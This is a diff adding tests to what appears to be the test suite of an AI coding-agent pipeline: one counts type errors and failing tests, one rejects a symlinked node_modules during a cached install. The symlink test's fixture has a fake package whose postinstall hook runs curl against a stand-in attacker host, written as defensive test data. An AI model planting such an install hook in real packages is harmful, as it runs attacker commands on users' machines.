@@ -20,6 +20,7 @@ import {
   readdir,
   readFile,
   rm,
+  symlink,
   writeFile,
 } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
@@ -455,6 +456,40 @@ describe('pipeline', () => {
     ]);
   });
 
+  it('counts a check where both the type check and the tests fail, and shows the model both', async () => {
+    const hub = await makeHub();
+    const sandbox = fakeSandbox({
+      'npm install': 'added 42 packages',
+      [CHECK]: [
+        check(0),
+        check(1, {
+          typeErrors: 2,
+          testOutput:
+            ' FAIL  src/checkout/discount.case.test.ts > accepts a lower-case code\nAssertionError: expected undefined to be 20',
+        }),
+        check(0),
+      ],
+    });
+    const model = scriptedInference([reproduce, fix]);
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      inference: model,
+    });
+
+    expect(out.status).toBe('proposed');
+    const counts = out.events.flatMap((e) =>
+      e.type === 'iteration' ? [[e.typeErrors, e.testsFailed]] : []
+    );
+    expect(counts[1]).toEqual([2, 1]);
+    // The proposal after that check sees the type errors and the failing test.
+    const prompt = JSON.stringify(model.calls[1]);
+    expect(prompt).toContain('error TS2339');
+    expect(prompt).toContain('AssertionError: expected undefined to be 20');
+  });
+
   it('counts a check whose markers are missing as failing', async () => {
     const hub = await makeHub();
     const sandbox = fakeSandbox({
@@ -799,6 +834,43 @@ describe('dependency cache', () => {
     expect(sandbox.lines()).toEqual(['npm ci']);
     expect(model.calls).toHaveLength(0);
     expect(await cacheContents()).toEqual([]);
+  });
+
+  it('ends a miss whose install left node_modules as a symlink as an error, leaving no entry', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    // A folder outside the cache, with a package the scanner would flag if
+    // it followed the link, and that must never become a mount source.
+    const outside = join(base, 'outside');
+    await mkdir(join(outside, 'evil'), { recursive: true });
+    await writeFile(
+      join(outside, 'evil', 'package.json'),
+      JSON.stringify({
+        name: 'evil',
+        version: '1.0.0',
+        scripts: { postinstall: 'curl -s https://collector.attacker.example' },
+      })
+    );
+    const sandbox = shopSandbox({
+      'npm ci': async (call) => {
+        await symlink(outside, join(call.workdir, 'node_modules'));
+        return 'added 1 package';
+      },
+    });
+    const model = scriptedInference([reproduce, fix]);
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      inference: model,
+    });
+
+    expect(out.status).toBe('error');
+    expect(out.reason).toMatch(/node_modules as something other than a folder/);
+    expect(sandbox.lines()).toEqual(['npm ci']);
+    expect(model.calls).toHaveLength(0);
+    expect(await cacheContents()).toEqual([]);
+    expect(await readdir(outside)).toEqual(['evil']);
   });
 
   it('ends a miss whose install fails as an error, leaving no entry', async () => {
